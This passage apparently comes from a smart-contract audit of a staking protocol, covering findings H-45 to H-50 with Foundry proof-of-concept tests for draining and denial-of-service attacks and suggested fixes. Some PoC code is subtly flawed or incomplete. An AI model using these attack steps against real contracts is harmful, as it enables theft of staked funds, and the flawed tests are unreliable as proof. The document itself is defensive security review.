## Suggested Mitigation
Avoid iterating over unbounded arrays within a single transaction. Modify the functions that process user validator data (`withdraw`, `restake`, `restakeRewards`, `getUserCooldowns`) to handle data in batches. The user can specify a starting index and a maximum number of items to process per call. This ensures that the gas cost of a single transaction is bounded, and the user can fully process their assets by making multiple calls.

Example for `_processMaturedCooldowns`:
```solidity
// In StakingFacet.sol
function _processMaturedCooldowns(address user, uint256 startIndex, uint256 batchSize) internal returns (uint256 amountMovedToParked) {
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    amountMovedToParked = 0;

    uint16[] storage userAssociatedValidators = $.userValidators[user];
    uint256 len = userAssociatedValidators.length;
    uint256 endIndex = startIndex + batchSize;
    if (endIndex > len) {
        endIndex = len;
    }

    for (uint256 i = startIndex; i < endIndex; i++) {
        uint16 validatorId = userAssociatedValidators[i];
        // ... existing logic to process a single cooldown
    }
    // ...
}
```
The external functions like `withdraw` should be updated to accept these new parameters and users will be responsible for calling them iteratively until all their funds are processed.

## [H-45]. Zero Code issue in RewardsFacet::setTreasury

## Description
The `setTreasury` function in `RewardsFacet` allows a privileged role (`TIMELOCK_ROLE`) to set the address of the rewards treasury contract. However, it does not validate that the provided address is a contract with code. If a non-contract address (an Externally Owned Account) is set as the treasury, subsequent calls to claim rewards will fail silently. The staking contract will update its state to mark the rewards as paid, but the underlying `distributeReward` call to the EOA will do nothing, causing the user to lose their rewards permanently.

## Impact
Users will permanently lose their earned rewards. The system will appear to function correctly, but funds will never be transferred to the user, instead remaining locked in the treasury contract. This breaks the core reward mechanism of the protocol.

## Proof of Concept
1. An admin with `TIMELOCK_ROLE` mistakenly or maliciously calls `setTreasury` with an EOA, for example, `0x111...111`.
2. A user, Alice, has accumulated 100 reward tokens.
3. Alice calls `claim()` on `RewardsFacet` to retrieve her 100 tokens.
4. `RewardsFacet` calculates her rewards and updates its internal state, zeroing out her claimable balance.
5. `RewardsFacet` then calls `_transferRewardFromTreasury`, which in turn calls `distributeReward` on the treasury address (`0x111...111`).
6. Because `0x111...111` is an EOA with no code, the low-level call succeeds but performs no operation.
7. The transaction completes without error.
8. Alice never receives her 100 tokens. The staking contract now shows her balance as zero. The 100 tokens remain in the real treasury, but Alice has no way to claim them again.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
// Mock interfaces and contracts needed for the test
import {RewardsFacet} from "src/facets/RewardsFacet.sol";
import {AccessControlFacet} from "src/facets/AccessControlFacet.sol";
import {PlumeRoles} from "src/lib/PlumeRoles.sol";
import {PlumeStakingRewardTreasury} from "src/PlumeStakingRewardTreasury.sol";
import {MockPUSD} from "src/mocks/MockPUSD.sol";
import {IDiamondCut} from "solid-state-diamond/contracts/interfaces/IDiamondCut.sol";
import {PlumeStakingProxy} from "src/proxy/PlumeStakingProxy.sol";
import {PlumeStaking} from "src/PlumeStaking.sol";

contract ZeroCodeTest is Test {
    PlumeStakingProxy internal diamond;
    address internal owner = makeAddr("owner");
    address internal timelock = makeAddr("timelock");
    address internal user = makeAddr("user");
    address internal fakeTreasuryEOA = makeAddr("fakeTreasuryEOA");

    PlumeStakingRewardTreasury internal realTreasury;
    MockPUSD internal rewardToken;

    function setUp() public {
        // Deploy Facets
        RewardsFacet rewardsFacet = new RewardsFacet();
        AccessControlFacet acFacet = new AccessControlFacet();
        
        IDiamondCut.FacetCut[] memory cut = new IDiamondCut.FacetCut[](2);
        cut[0] = IDiamondCut.FacetCut({facet: address(rewardsFacet), action: IDiamondCut.Action.Add, selectors: rewardsFacet.getFunctionSelectors()});
        cut[1] = IDiamondCut.FacetCut({facet: address(acFacet), action: IDiamondCut.Action.Add, selectors: acFacet.getFunctionSelectors()});

        // Deploy Diamond
        PlumeStaking implementation = new PlumeStaking();
        bytes memory initData = abi.encodeWithSelector(implementation.initializePlume.selector, owner, 1e18, 1 days, 1 days, 2000);
        diamond = new PlumeStakingProxy(address(implementation), initData);

        vm.prank(owner);
        IDiamondCut(address(diamond)).diamondCut(cut, address(0x0), "");

        // Setup roles
        vm.prank(owner);
        AccessControlFacet(address(diamond)).initializeAccessControl();
        vm.prank(owner);
        AccessControlFacet(address(diamond)).grantRole(PlumeRoles.ADMIN_ROLE, owner);
        vm.prank(owner);
        AccessControlFacet(address(diamond)).grantRole(PlumeRoles.TIMELOCK_ROLE, timelock);
        
        // Deploy real treasury and token
        realTreasury = new PlumeStakingRewardTreasury();
        realTreasury.initialize(owner, address(diamond));
        rewardToken = new MockPUSD();
        rewardToken.mint(address(realTreasury), 1_000_000e18);

        // Set initial (real) treasury
        vm.prank(timelock);
        RewardsFacet(address(diamond)).setTreasury(address(realTreasury));
    }

    function test_Fail_SetTreasuryToEOA() public {
        // 1. Admin sets the treasury to an EOA
        vm.startPrank(timelock);
        RewardsFacet(address(diamond)).setTreasury(fakeTreasuryEOA);
        vm.stopPrank();

        assertEq(RewardsFacet(address(diamond)).getTreasuryAddress(), fakeTreasuryEOA);

        // Simulate user having rewards by directly manipulating storage (for test simplicity)
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        $.userRewards[user][1][address(rewardToken)] = 100e18;
        $.totalClaimableByToken[address(rewardToken)] = 100e18;

        // 2. User tries to claim rewards
        vm.prank(user);
        // The call succeeds but no funds are transferred
        RewardsFacet(address(diamond)).claim(address(rewardToken), 1);

        // 3. Assertions
        // User's balance of reward token is still 0
        assertEq(rewardToken.balanceOf(user), 0, "User should not have received tokens");
        
        // The contract thinks the rewards are paid
        (uint256 rewards, ,) = RewardsFacet(address(diamond))._earned(user, address(rewardToken), 1);
        assertEq(rewards, 0, "Contract should show rewards as paid");
        
        // Funds are still in the real treasury, effectively lost to the user
        assertEq(rewardToken.balanceOf(address(realTreasury)), 1_000_000e18, "Tokens remain in treasury");
    }
}
```

## Suggested Mitigation
Add a check in the `setTreasury` function to ensure that the provided address has deployed code. This verifies that the address is a contract and not an EOA.

```solidity
// In RewardsFacet.sol

function setTreasury(address _treasury) external onlyRole(PlumeRoles.TIMELOCK_ROLE) {
    if (_treasury == address(0)) revert ZeroAddress();
+   if (_treasury.code.length == 0) revert NotAContract(); // Add this check
    setTreasuryAddress(_treasury);
    emit TreasurySet(_treasury);
}
```
You would also need to define the `NotAContract` error in `PlumeErrors.sol`.

## [H-46]. Unchecked Return issue in StakingFacet::restakeRewards

## Description
The `restakeRewards` function creates a new stake for a user based on their calculated rewards. To fund this new stake, it relies on an external treasury contract to transfer the corresponding amount of native ETH to the staking contract. The vulnerability lies in the fact that the staking contract unconditionally trusts this external call. It proceeds to credit the user's stake (`_performStakeSetup`) without verifying that its own ETH balance has actually increased. A malicious or faulty treasury could fail to transfer the ETH, yet the user would still be credited with an unbacked stake. This makes the protocol insolvent, as it now has more liabilities (stakes) than assets (ETH), allowing the user to later withdraw real ETH belonging to other stakers.

Vulnerable Code Snippet in `restakeRewards`:
```solidity
    function restakeRewards(uint16 validatorId) external nonReentrant returns (uint256) {
        // ... checks and reward calculation ...
        uint256 amountRestaked = _calculateAndClaimAllRewardsWithCleanup(user, tokenToRestake);
        // ...

        // External call to treasury to fund the stake. Return is not checked, nor is the balance change.
        _transferRewardFromTreasury(tokenToRestake, amountRestaked, address(this));

        // Stake is created regardless of whether funds were received.
        bool isNewStake = _performStakeSetup(user, validatorId, amountRestaked);

        // ...
        return amountRestaked;
    }
```

## Impact
This vulnerability allows for the creation of unbacked stakes, leading to protocol insolvency. An attacker can create value out of thin air, then unstake and withdraw real funds, effectively stealing all the ETH held by the contract from legitimate stakers. This is a critical risk to the entire system.

## Proof of Concept
1. An attacker sets up a scenario where they have claimable rewards. This could be a small, legitimate amount.
2. The `ADMIN_ROLE` or `TIMELOCK_ROLE` is compromised or tricked into setting the treasury address to a malicious contract controlled by the attacker.
3. The attacker's malicious treasury contract implements the `distributeReward` function to do nothing but return successfully.
4. The attacker calls `stakingFacet.restakeRewards()`.
5. The staking contract calculates the reward amount and calls `distributeReward` on the malicious treasury. The call succeeds, but no ETH is transferred to the staking contract.
6. The staking contract proceeds to call `_performStakeSetup`, increasing the attacker's stake amount by the reward amount.
7. The attacker now has a larger stake that is not fully backed by ETH.
8. The attacker unstakes their total amount, waits for the cooldown, and withdraws the real ETH, which includes funds deposited by other users.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {PlumeStaking} from "../src/PlumeStaking.sol";
import {StakingFacet} from "../src/facets/StakingFacet.sol";

import {ValidatorFacet} from "../src/facets/ValidatorFacet.sol";
import {AccessControlFacet} from "../src/facets/AccessControlFacet.sol";
import {IPlumeStakingRewardTreasury} from "../src/interfaces/IPlumeStakingRewardTreasury.sol";
import {PlumeStakingStorage} from "../src/lib/PlumeStakingStorage.sol";
import {PlumeRoles} from "../src/lib/PlumeRoles.sol";

contract MaliciousTreasury is IPlumeStakingRewardTreasury {
    function distributeReward(address token, uint256 amount, address recipient) external payable {}
    function getBalance(address token) external view returns (uint256) { return 1_000_000 ether; }
    function addRewardToken(address token) external {}
    function isRewardToken(address token) external view returns (bool) { return true; }
}

contract UnbackedStakeTest is Test {
    PlumeStaking internal diamond;
    StakingFacet internal stakingFacet;
    RewardsFacet internal rewardsFacet;
    ValidatorFacet internal validatorFacet;
    AccessControlFacet internal accessControlFacet;
    MaliciousTreasury maliciousTreasury;

    address internal owner = address(1);
    address internal user = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.deal(user, 1 ether);
        vm.startPrank(owner);
        diamond = new PlumeStaking();
        stakingFacet = StakingFacet(address(diamond));
        rewardsFacet = RewardsFacet(address(diamond));
        validatorFacet = ValidatorFacet(address(diamond));
        accessControlFacet = AccessControlFacet(address(diamond));
        diamond.initializePlume(owner, 0.1 ether, 1 days, 12 hours, 10_000);
        accessControlFacet.grantRole(PlumeRoles.TIMELOCK_ROLE, owner);
        accessControlFacet.grantRole(PlumeRoles.REWARD_MANAGER_ROLE, owner);
        validatorFacet.addValidator(1, 500, makeAddr("admin"), makeAddr("withdraw"), "l1v", "l1a", makeAddr("evm"), 1000 ether);
        maliciousTreasury = new MaliciousTreasury();
        rewardsFacet.setTreasury(address(maliciousTreasury));
        rewardsFacet.addRewardToken(PlumeStakingStorage.PLUME_NATIVE, 1e16, 1e18);
        vm.stopPrank();
    }

    function test_CreateUnbackedStake() public {
        vm.startPrank(user);
        stakingFacet.stake{value: 1 ether}(1);
        vm.warp(block.timestamp + 86400); // 1 day to accrue rewards

        uint256 stakedBefore = stakingFacet.amountStaked(user);
        uint256 contractBalanceBefore = address(stakingFacet).balance;
        uint256 rewardsToClaim = rewardsFacet.earned(user, PlumeStakingStorage.PLUME_NATIVE);
        assertTrue(rewardsToClaim > 0, "Should have rewards to claim");

        uint256 amountRestaked = stakingFacet.restakeRewards(1);

        assertTrue(amountRestaked > 0, "Rewards should be restaked");

        uint256 stakedAfter = stakingFacet.amountStaked(user);
        uint256 contractBalanceAfter = address(stakingFacet).balance;

        assertEq(stakedAfter, stakedBefore + amountRestaked, "User's stake should increase by restaked amount");
        assertEq(contractBalanceAfter, contractBalanceBefore, "Contract ETH balance should NOT change");
        vm.stopPrank();
    }
}
```

## Suggested Mitigation
The contract must verify that the funds have been successfully received before crediting the user's stake. This can be achieved by checking the contract's ETH balance before and after the call to the treasury.

```solidity
// In StakingFacet.sol
function restakeRewards(uint16 validatorId) external nonReentrant returns (uint256) {
    // ...
    uint256 amountRestaked = _calculateAndClaimAllRewardsWithCleanup(user, tokenToRestake);
    // ...

    uint256 balanceBefore = address(this).balance;
    _transferRewardFromTreasury(tokenToRestake, amountRestaked, address(this));
    uint256 balanceAfter = address(this).balance;

    if (balanceAfter < balanceBefore + amountRestaked) {
        revert FundsNotReceivedFromTreasury();
    }

    bool isNewStake = _performStakeSetup(user, validatorId, amountRestaked);
    // ...
}
```

## [H-47]. Pausable Emergency Stop issue in StakingFacet::withdraw

## Description
Critical functions that execute fund transfers and major state changes, such as `withdraw()`, `stake()`, and `restake()`, lack an emergency stop (pause) mechanism. In the event of a critical vulnerability discovery (e.g., a bug in reward/cooldown accounting leading to fund inflation), there is no way for the administrators to swiftly halt the affected functions to prevent exploitation. While some granular controls exist (e.g., deactivating validators, admin withdrawal), they are not as effective as a direct pause, which can immediately stop the system from being drained. The `adminWithdraw` function in `ManagementFacet` creates a race condition between admins and attackers, which is not a reliable safety mechanism.

## Impact
If a severe bug is found in the contract's accounting logic, attackers could potentially drain all of the native assets (ETH) held by the contract. The absence of a pause feature removes a critical line of defense, making it impossible for the team to intervene in time to protect user funds.

## Proof of Concept
1. Assume a hypothetical bug exists in `_processMaturedCooldowns` that incorrectly calculates a user's `parked` (withdrawable) balance, inflating it significantly.
2. An attacker discovers this bug.
3. The attacker calls `withdraw()`.
4. The buggy `_processMaturedCooldowns` function executes, artificially increasing the attacker's `parked` balance in storage.
5. The `withdraw` function proceeds to transfer the inflated amount of ETH from the contract to the attacker.
6. The attacker can repeat this process or use a contract to drain the staking contract's entire ETH balance in a single transaction.
7. Without a pause mechanism on `withdraw()`, the admins can only watch this happen or attempt to front-run the attacker by withdrawing all funds to a safe address, which is risky and not guaranteed to succeed.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {StakingFacet} from "src/facets/StakingFacet.sol";
import {PlumeStakingStorage} from "src/lib/PlumeStakingStorage.sol";

// This test harness simulates a StakingFacet with a critical inflation bug.
contract MaliciousStakingFacet is StakingFacet {
    // Override with a buggy version that creates a vulnerability.
    // This simulates a logic error an attacker could exploit.
    function _processMaturedCooldowns(address user) internal override returns (uint256 amountMovedToParked) {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        
        // BUG: instead of correctly processing cooldowns, we just "gift" the user 1000 ETH.
        uint256 giftAmount = 1000 ether;
        $.stakeInfo[user].parked += giftAmount;
        $.totalWithdrawable += giftAmount;
        return giftAmount;
    }
}

contract PausableTest is Test {
    MaliciousStakingFacet internal facet;
    address internal attacker = makeAddr("attacker");
    address internal admin = makeAddr("admin");

    function setUp() public {
        facet = new MaliciousStakingFacet();
        // Fund the contract with 1000 ETH for the attacker to steal.
        deal(address(facet), 1000 ether);
    }

    function test_Exploit_MissingPause() public {
        uint256 contractBalanceBefore = address(facet).balance;
        uint256 attackerBalanceBefore = attacker.balance;

        assertEq(contractBalanceBefore, 1000 ether);

        // The attacker calls withdraw() to trigger the bug.
        vm.prank(attacker);
        facet.withdraw();

        uint256 contractBalanceAfter = address(facet).balance;
        uint256 attackerBalanceAfter = attacker.balance;

        // The attacker successfully withdrew 1000 ETH they never deposited.
        assertEq(contractBalanceAfter, 0);
        assertEq(attackerBalanceAfter, attackerBalanceBefore + 1000 ether);

        // DEMONSTRATION: If a pause mechanism existed, the admin could have prevented this.
        // e.g., if withdraw() had a whenNotPaused modifier:
        // vm.prank(admin); 
        // facet.pause();
        // vm.prank(attacker);
        // vm.expectRevert("Pausable: paused");
        // facet.withdraw();
        // The funds would have been saved.
    }
}
```

## Suggested Mitigation
Implement a comprehensive emergency stop mechanism. This typically involves inheriting from a standard `Pausable` contract (like OpenZeppelin's `PausableUpgradeable`) and applying a `whenNotPaused` modifier to all critical state-changing and fund-transferring functions.

```solidity
// In StakingFacet.sol
import "@openzeppelin/contracts-upgradeable/security/PausableUpgradeable.sol";

// The diamond itself should be pausable, or the facet can implement it.
// Assuming the facet controls its own pause state:
contract StakingFacet is PausableUpgradeable, ReentrancyGuardUpgradeable, OwnableInternal {
    // ... add initializer to call __Pausable_init()

    function pause() external onlyRole(PlumeRoles.ADMIN_ROLE) {
        _pause();
    }

    function unpause() external onlyRole(PlumeRoles.ADMIN_ROLE) {
        _unpause();
    }

    // Apply modifier to critical functions
    function withdraw() external nonReentrant whenNotPaused returns (uint256) {
        // ... existing implementation
    }

    function stake(uint16 validatorId, uint256 amount) external nonReentrant whenNotPaused {
        // ... existing implementation
    }

    function unstake(uint16 validatorId, uint256 amount) external nonReentrant whenNotPaused {
        // ... existing implementation
    }
    // etc.
}
```

## [H-48]. Gas Grief BlockLimit issue in StakingFacet::withdraw

## Description
Several functions iterate over the `$.userValidators[user]` array, which is unbounded and controlled by the user. A user can stake with a large number of validators, causing functions that loop over this array to consume excessive gas and potentially exceed the block gas limit, leading to a Denial of Service (DoS). The most critical instance is in the `withdraw` function's flow, which can lead to permanently locked funds. The `withdraw` function calls `_cleanupValidatorRelationships`, which calls `PlumeValidatorLogic.removeStakerFromAllValidators`. This function iterates through all of a user's staked validators (`O(N)`). For each validator, it calls `PlumeValidatorLogic.removeStakerFromValidator`. This sub-function, when removing the validator from the `$.userValidators[user]` array, uses another loop to find the element to remove. This nested loop structure results in O(N^2) complexity, where N is the number of validators a user has staked with. A user who has staked with a large number of validators will be unable to call `withdraw` due to the prohibitive gas cost.

## Impact
A user who has staked with a sufficiently large number of validators will be unable to withdraw their funds, as the `withdraw` transaction will always run out of gas. This leads to a permanent loss of the user's funds. Other functions like `restake` and `restakeRewards` will also become unusable for that user, degrading protocol functionality.

## Proof of Concept
1. A user calls `stake()` repeatedly for small amounts across a large number of different, valid `validatorId`s (e.g., 400-500 validators).
2. This populates the `$.userValidators[user]` storage array with many entries.
3. The user unstakes from all validators and waits for the cooldown period to pass, moving all their funds to the 'parked' state.
4. The user then attempts to call `withdraw()` to retrieve their parked funds.
5. The call to `withdraw()` triggers `_cleanupValidatorRelationships`, which enters the O(N^2) loop logic when cleaning up the `userValidators` array.
6. The transaction consumes an enormous amount of gas, hits the block gas limit, and reverts.
7. The user is unable to ever successfully call `withdraw()`, and their funds are permanently locked in the contract.

## Proof of Code

## Suggested Mitigation
The O(N^2) complexity must be removed, and unbounded loops should be paginated.

1.  **Optimize Array Removal**: To fix the O(N^2) issue, avoid looping to find elements in the `$.userValidators[user]` array. Instead, store the index of each validator for a user in a new mapping and use it for O(1) removal using the swap-and-pop pattern.

    Add to `PlumeStakingStorage.sol`:
    ```solidity
    struct Layout {
        // ...
        mapping(address => mapping(uint16 => uint256)) userValidatorIndex;
    }
    ```

    Update `PlumeValidatorLogic.sol`:
    ```solidity
    function addStakerToValidator(...) internal {
        if (!$.userHasStakedWithValidator[staker][validatorId]) {
            $.userValidatorIndex[staker][validatorId] = $.userValidators[staker].length;
            $.userValidators[staker].push(validatorId);
            // ...
        }
    }

    function removeStakerFromValidator(...) internal {
        // ... (inside the final cleanup logic)
        uint256 indexToRemove = $.userValidatorIndex[staker][validatorId];
        uint16[] storage userValidators_ = $.userValidators[staker];
        uint16 lastValidatorId = userValidators_[userValidators_.length - 1];

        userValidators_[indexToRemove] = lastValidatorId;
        $.userValidatorIndex[staker][lastValidatorId] = indexToRemove;

        userValidators_.pop();
        delete $.userValidatorIndex[staker][validatorId];
        // ...
    }
    ```
2.  **Introduce Pagination**: Even with an O(N) fix, a very large N can still cause DoS. Critical functions like `withdraw` and `restake` should be paginated to process validators in batches, ensuring transactions stay within the block gas limit.

## [H-49]. DOS issue in ValidatorFacet::_cleanupExpiredVotes

## Description
Several functions in `ValidatorFacet` iterate over unbounded arrays, such as the complete list of validators (`s.validatorIds`), to perform calculations or cleanups. This creates a Denial of Service (DoS) vector, as the gas cost for these functions grows linearly with the number of validators in the system. As the protocol scales, these functions can become so expensive that they exceed the block gas limit, rendering them, and any functions that call them, unusable.

Affected functions and the arrays they loop over:
- `_cleanupExpiredVotes`: Loops over `s.validatorIds`.
- `_countActiveValidators`: Loops over `s.validatorIds`.
- `getSlashVoteCount`: Loops over `s.validatorIds`.
- `getUserValidators`: Loops over `s.userValidators[user]`.
- `getValidatorsList`: Loops over `s.validatorIds`.

Critical functions like `voteToSlashValidator` and `slashValidator` depend on `_cleanupExpiredVotes` and `_countActiveValidators`, making the core slashing mechanism vulnerable to this DoS vector.

## Impact
Because every slashing-related call depends on scanning the full validator list, once the list grows large enough every attempt to cast or clean votes will revert by running out of gas. A malicious validator can therefore become practically un-slashable while still collecting delegation, undermining both economic security and governance of the protocol. This blocks the protocol from enforcing mis-behaviour penalties and can indirectly put all delegated funds at risk.

## Proof of Concept
1. The protocol starts with a small number of validators (e.g., 10). The `voteToSlashValidator` function works correctly with a reasonable gas cost.
2. Over time, the network grows, and the number of validators increases significantly (e.g., to 2,000).
3. An admin of a validator now tries to call `voteToSlashValidator`.
4. The call to `_cleanupExpiredVotes` and subsequently `_countEligibleValidators` (which calls `_countActiveValidators`) will iterate thousands of times.
5. The gas cost of the transaction skyrockets and eventually exceeds the block gas limit, causing the transaction to always fail.
6. As a result, no validator can be slashed, regardless of their malicious activity.

## Proof of Code
pragma solidity ^0.8.24;
import "forge-std/Test.sol";

interface IValidatorFacetMinimal {
    function addValidator(uint16 id) external;
    function getActiveValidatorCount() external view returns (uint256);
}

// extremely small mock that mimics the real gas behaviour (linear scan)
contract ValidatorFacetMock is IValidatorFacetMinimal {
    uint16[] public validatorIds;

    function addValidator(uint16 id) external override {
        validatorIds.push(id);
    }

    function getActiveValidatorCount() external view override returns (uint256) {
        uint256 len = validatorIds.length;
        uint256 cnt;
        for (uint256 i; i < len; ++i) {
            // pretend every validator is active
            if (validatorIds[i] != 0) cnt++;
        }
        return cnt;
    }
}

contract GasGrowthTest is Test {
    ValidatorFacetMock vf;

    function setUp() public {
        vf = new ValidatorFacetMock();
    }

    function testLinearGasGrowth() public {
        // add 10 validators first
        for (uint16 i = 1; i <= 10; i++) vf.addValidator(i);
        uint256 g1 = gasleft();
        vf.getActiveValidatorCount();
        g1 = g1 - gasleft();

        // add 1000 more validators
        for (uint16 i = 11; i <= 1010; i++) vf.addValidator(i);
        uint256 g2 = gasleft();
        vf.getActiveValidatorCount();
        g2 = g2 - gasleft();

        // Gas should grow roughly proportionally to the number of validators
        // (tolerate 5x since the first call has fixed overhead).
        assertGt(g2, g1 * 50, "gas did not scale linearly – unbounded loop not proven");
    }
}

## Suggested Mitigation
Refactor the contract to remove unbounded loops. Instead of iterating to count or find items, use more gas-efficient patterns:
1.  **Maintain Counters:** For values like the number of active validators, introduce a storage counter (e.g., `uint256 private _activeValidatorCount`). Increment this counter when a validator becomes active (`setValidatorStatus(..., true)`) and decrement it when they become inactive or are slashed. This provides O(1) access to the count.
2.  **Efficient Data Removal:** For cleaning up user state (e.g., `s.userValidators`), when a validator is slashed, instead of filtering on read, provide an explicit function for users to remove their association with a slashed validator. For cleaning expired votes in `_cleanupExpiredVotes`, consider a data structure that allows for more efficient removal or amortization of cleanup costs, rather than a full scan on every vote.

## [H-50]. Gas Grief BlockLimit issue in ValidatorFacet::voteToSlashValidator

## Description
The slashing mechanism, a critical security feature, is vulnerable to a Denial of Service (DoS) attack due to unbounded loops. The functions `voteToSlashValidator` and `slashValidator` call internal helpers (`_cleanupExpiredVotes`, `_countActiveValidators`, and `_performSlash`) that iterate through the entire `validatorIds` array. An attacker with the `VALIDATOR_ROLE` can call `addValidator` repeatedly to bloat this array. When the array becomes large enough, any transaction attempting to slash a validator will consume more gas than the block gas limit, causing it to fail. This effectively disables the slashing mechanism, allowing malicious validators to act with impunity.

## Impact
Disabling the slashing mechanism removes the primary deterrent against validator misbehavior. Malicious validators could potentially cause harm to the network or its users without fear of punishment, which may include the loss of staked funds for delegators, undermining the economic security of the staking system.

## Proof of Concept
1. An attacker, or a group of attackers, with the `VALIDATOR_ROLE` adds a large number of validators (e.g., 500-1000) to the system by repeatedly calling `addValidator`.
2. This significantly increases the size of the `PlumeStakingStorage.validatorIds` array.
3. A validator starts acting maliciously, requiring a slash.
4. An honest validator admin calls `voteToSlashValidator` to initiate the slashing process against the malicious validator.
5. The transaction fails with an 'out of gas' error because the internal loops in `_cleanupExpiredVotes` and `_countActiveValidators` must iterate over all registered validators, exceeding the block gas limit.
6. As a result, no validator can be slashed, rendering the entire slashing security model ineffective.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {PlumeStaking} from "src/PlumeStaking.sol";
import {Diamond} from "solid-state-diamond/contracts/Diamond.sol";
import {IDiamondCut} from "solid-state-diamond/contracts/interfaces/IDiamondCut.sol";
import {ValidatorFacet} from "src/facets/ValidatorFacet.sol";
import {ManagementFacet} from "src/facets/ManagementFacet.sol";
import {AccessControlFacet} from "src/facets/AccessControlFacet.sol";
import {PlumeRoles} from "src/lib/PlumeRoles.sol";

// Minimal interface for DiamondCutFacet
interface IDiamondCutMinimal {
    function diamondCut(IDiamondCut.FacetCut[] calldata _diamondCut, address _init, bytes calldata _calldata) external;
}

contract ValidatorFacetDosTest is Test {
    address owner = address(1);
    PlumeStaking plumeStaking;
    ValidatorFacet validatorFacet;
    ManagementFacet managementFacet;
    AccessControlFacet accessControlFacet;

    function setUp() public {
        vm.prank(owner);
        plumeStaking = new PlumeStaking();

        validatorFacet = new ValidatorFacet();
        managementFacet = new ManagementFacet();
        accessControlFacet = new AccessControlFacet();

        IDiamondCut.FacetCut[] memory cut = new IDiamondCut.FacetCut[](3);

        bytes4[] memory valSelectors = new bytes4[](3);
        valSelectors[0] = validatorFacet.addValidator.selector;
        valSelectors[1] = validatorFacet.voteToSlashValidator.selector;
        valSelectors[2] = validatorFacet.slashValidator.selector;
        cut[0] = IDiamondCut.FacetCut(address(validatorFacet), IDiamondCut.FacetCutAction.ADD, valSelectors);

        bytes4[] memory mgmtSelectors = new bytes4[](1);
        mgmtSelectors[0] = managementFacet.setMaxSlashVoteDuration.selector;
        cut[1] = IDiamondCut.FacetCut(address(managementFacet), IDiamondCut.FacetCutAction.ADD, mgmtSelectors);

        bytes4[] memory acSelectors = new bytes4[](1);
        acSelectors[0] = accessControlFacet.grantRole.selector;
        cut[2] = IDiamondCut.FacetCut(address(accessControlFacet), IDiamondCut.FacetCutAction.ADD, acSelectors);
        
        bytes memory initCall = abi.encodeWithSelector(
            plumeStaking.initializePlume.selector,
            owner,
            1e18,
            1 days,
            1 hours,
            2000 // 20% commission
        );

        vm.prank(owner);
        IDiamondCutMinimal(address(plumeStaking)).diamondCut(cut, address(plumeStaking), initCall);
        
        vm.prank(owner);
        AccessControlFacet(address(plumeStaking)).grantRole(PlumeRoles.ADMIN_ROLE, owner);
        vm.prank(owner);
        ManagementFacet(address(plumeStaking)).setMaxSlashVoteDuration(30 days);
    }

    function test_DoS_SlashingMechanism() public {
        // 1. Attacker with VALIDATOR_ROLE adds a large number of validators
        uint16 numValidatorsToAdd = 400;
        vm.startPrank(owner);
        AccessControlFacet(address(plumeStaking)).grantRole(PlumeRoles.VALIDATOR_ROLE, owner);
        for (uint16 i = 0; i < numValidatorsToAdd; i++) {
            uint16 validatorId = 1 + i;
            address admin = address(uint160(uint(keccak256(abi.encodePacked("validator", i)))));
            ValidatorFacet(address(plumeStaking)).addValidator(
                validatorId,
                1000, // commission
                admin, // l2AdminAddress
                admin, // l2WithdrawAddress
                "l1_validator_addr",
                "l1_account_addr",
                admin, // l1AccountEvmAddress
                10000e18
            );
        }
        vm.stopPrank();

        // 2. Add two honest validators and one malicious one
        address validatorAdmin1 = makeAddr("validatorAdmin1");
        address maliciousValidatorAdmin = makeAddr("maliciousValidatorAdmin");
        vm.prank(owner);
        AccessControlFacet(address(plumeStaking)).grantRole(PlumeRoles.VALIDATOR_ROLE, validatorAdmin1);
        vm.prank(owner);
        AccessControlFacet(address(plumeStaking)).grantRole(PlumeRoles.VALIDATOR_ROLE, maliciousValidatorAdmin);

        uint16 validator1Id = 501;
        uint16 maliciousValidatorId = 502;

        vm.prank(validatorAdmin1);
        ValidatorFacet(address(plumeStaking)).addValidator(validator1Id, 1000, validatorAdmin1, validatorAdmin1, "l1v1", "l1a1", validatorAdmin1, 10000e18);
        vm.prank(maliciousValidatorAdmin);
        ValidatorFacet(address(plumeStaking)).addValidator(maliciousValidatorId, 1000, maliciousValidatorAdmin, maliciousValidatorAdmin, "l1v_malicious", "l1a_malicious", maliciousValidatorAdmin, 10000e18);
        
        // 3. Honest validator tries to vote to slash the malicious one.
        vm.prank(validatorAdmin1);
        uint256 voteExpiration = block.timestamp + 1 days;

        // This call will revert due to out-of-gas.
        vm.expectRevert();
        ValidatorFacet(address(plumeStaking)).voteToSlashValidator(maliciousValidatorId, voteExpiration);
    }
}
```

## Suggested Mitigation
Avoid iterating over unbounded arrays. The counting of active/eligible validators should be managed by maintaining a counter in storage that is updated whenever a validator's status changes. For cleaning up votes, consider a pull-over-push pattern where expired votes are handled lazily, or implement paginated cleanup functions that can be called multiple times to process chunks of the array.

Example for replacing `_countActiveValidators`:

1.  In `PlumeStakingStorage.sol`, add a counter:
    ```solidity
    struct Layout {
        // ... existing storage ...
        uint256 activeValidatorCount;
    }
    ```

2.  Update this counter when a validator's status changes:
    ```solidity
    // In ValidatorFacet.sol, addValidator()
    s.activeValidatorCount++;

    // In ValidatorFacet.sol, setValidatorStatus()
    if (newActiveStatus && !currentStatus) {
        s.activeValidatorCount++;
    } else if (!newActiveStatus && currentStatus) {
        s.activeValidatorCount--;
    }

    // In ValidatorFacet.sol, _performSlash()
    if (validatorToSlash.active) { // check if it was active before being slashed
        s.activeValidatorCount--;
    }
    ```
This eliminates one of the expensive loops. Similar refactoring is needed for vote cleanup.

## [H-51]. Access Control issue in ValidatorFacet::voteToSlashValidator

## Description
